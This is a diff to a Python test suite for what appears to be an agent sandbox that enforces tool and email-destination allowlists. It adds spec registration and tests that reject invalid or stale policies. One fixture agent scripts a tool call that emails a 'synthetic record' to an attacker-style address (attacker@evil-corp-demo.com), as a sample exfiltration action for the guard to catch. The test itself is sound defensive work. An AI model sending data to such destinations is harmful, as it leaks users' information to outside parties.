@@ -38,9 +38,16 @@ def factory():
         call("send_partner_email", to="attacker@evil-corp-demo.com", body="synthetic record"),
         call("send_email", to="bob@northwind.example", body="Your meeting brief."),
         AIMessage("Done.")), tools=[send_email, send_partner_email])
-    return mirage.protect(graph, name="assistant", allow={
+    allow = {
         "tools": ["send_email", "send_partner_email"],
-        "email_to": ["northwind.example"], "url_hosts": []})
+        "email_to": ["northwind.example"], "url_hosts": []}
+    protected = mirage.protect(graph, name="assistant", allow=allow)
+    # Publish the agreed internal seam; automatic SDK registration has a separate owner.
+    from mirage import core
+    core._sandbox["call_tool"].register_spec({"name": "assistant", "owner": "test",
+        "tools": ["send_email", "send_partner_email"], "allow": allow,
+        "entrypoint": "current_catalogue_agent:factory"})
+    return protected
 
 def new_tool(snapshot, call_tool):
     call_tool("send_partner_email", {
@@ -69,6 +76,12 @@ def unregistered_factory():
     from mirage.protect import registry
     registry["assistant"] = lambda task: core.tool("send_email",
         {"to": "bob@northwind.example", "body": "Brief."}, lambda: None)
+
+def invalid_spec(snapshot, call_tool):
+    call_tool.register_spec({"name": "assistant", "owner": "test",
+        "tools": ["send_email"], "entrypoint": "test:factory",
+        "allow": {"tools": "invalid tool catalogue"}})
+    call_tool("send_email", {"to": "bob@northwind.example", "body": "Brief."})
 '''
 
 
@@ -180,10 +193,36 @@ def test_child_uses_current_registered_catalogue_for_new_tool(agent_module):
     assert all(e.get("error") is None for e in effects)
 
 
+@pytest.mark.parametrize("runner,crashes", [("factory", False), ("declares_then_crashes", True)])
+def test_parent_receives_validated_spec_without_changing_two_value_return(agent_module,
+                                                                       runner, crashes):
+    snap = frozen_snapshot(f"current_catalogue_agent:{runner}", sdk=not crashes)
+    current = {}
+
+    effects, error = sandbox.run_once(snap, current_spec=current)
+
+    assert bool(error) == crashes
+    assert effects[0]["tool"] == "send_partner_email"
+    assert current["name"] == snap["agent"]
+    assert current["tools"] == ["send_email", "send_partner_email"]
+    assert current["allow"]["email_to"] == ["northwind.example"]
+    assert "_current_tools" not in snap
+
+
 def test_sdk_runner_without_current_metadata_cannot_pass(agent_module):
     frozen_snapshot("current_catalogue_agent:unregistered_factory", sdk=True)
     with pytest.raises(sandbox.DetonationError, match="current.*spec|metadata"):
         verify()
+
+
+def test_parent_rejects_invalid_current_spec_instead_of_using_stale_policy(agent_module):
+    snap = frozen_snapshot("current_catalogue_agent:invalid_spec")
+    current = {}
+
+    effects, error = sandbox.run_once(snap, current_spec=current)
+
+    assert effects and current == {}
+    assert error and "current agent spec" in error
 
 
 def test_current_factory_destination_restriction_is_enforced(agent_module):
